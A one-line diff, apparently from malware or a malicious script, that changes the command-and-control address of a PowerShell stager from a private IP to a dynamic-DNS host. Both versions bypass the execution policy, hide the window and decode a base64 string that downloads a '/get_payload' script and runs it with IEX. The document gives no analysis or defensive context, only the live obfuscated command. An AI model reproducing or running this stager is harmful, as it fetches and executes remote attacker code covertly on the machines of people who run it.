@@ -1,1 +1,1 @@
-powershell -exec bypass -WindowStyle Hidden IEX(IEX("[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('KE5ldy1PYmplY3QgTmV0LldlYkNsaWVudCkuRG93bmxvYWRTdHJpbmcoImh0dHA6Ly8xMC4yMC4zMC4zMDo4ODg4L2dldF9wYXlsb2FkIik='))"))
+powershell -exec bypass -WindowStyle Hidden IEX(IEX("[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('KE5ldy1PYmplY3QgTmV0LldlYkNsaWVudCkuRG93bmxvYWRTdHJpbmcoImh0dHA6Ly9pZC0xOC5ob3N0ZGRucy51czo3MTE1L2dldF9wYXlsb2FkIik='))"))
